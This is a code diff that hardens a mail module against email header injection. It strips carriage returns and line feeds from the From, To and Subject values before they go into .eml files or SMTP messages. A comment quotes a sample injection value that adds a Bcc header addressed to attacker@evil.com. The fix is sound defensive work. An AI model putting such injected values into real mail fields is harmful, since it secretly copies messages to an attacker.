@@ -44,13 +44,23 @@ function getSmtpTransporter(): Transporter {
   return smtpTransporter;
 }
 
+/**
+ * SEC-009: strip CRLF (and lone CR / lone LF) from values that are interpolated
+ * directly into RFC 5322 headers. Without this, a malicious display name or
+ * subject containing "\r\nBcc: attacker@evil.com" would inject an extra header.
+ * Bodies are NOT sanitised — multi-line text content is legitimate there.
+ */
+function sanitizeHeader(value: string): string {
+  return value.replace(/[\r\n]+/g, ' ').trim();
+}
+
 function buildEmlContent(payload: MailPayload & { from: string }): string {
   const date = new Date().toUTCString();
   const boundary = `----=_Part_${Date.now()}`;
   const lines: string[] = [
-    `From: ${payload.from}`,
-    `To: ${payload.to}`,
-    `Subject: ${payload.subject}`,
+    `From: ${sanitizeHeader(payload.from)}`,
+    `To: ${sanitizeHeader(payload.to)}`,
+    `Subject: ${sanitizeHeader(payload.subject)}`,
     `Date: ${date}`,
     `MIME-Version: 1.0`,
   ];
@@ -93,10 +103,12 @@ async function sendViaFilesystem(payload: MailPayload): Promise<void> {
 
 async function sendViaSmtp(payload: MailPayload): Promise<void> {
   const transporter = getSmtpTransporter();
+  // SEC-009: nodemailer encodes headers safely on its own, but we still
+  // strip CRLF defensively so a tampered subject can't smuggle headers.
   await transporter.sendMail({
-    from: MAIL_FROM,
-    to: payload.to,
-    subject: payload.subject,
+    from: sanitizeHeader(MAIL_FROM),
+    to: sanitizeHeader(payload.to),
+    subject: sanitizeHeader(payload.subject),
     text: payload.text,
     html: payload.html,
   });
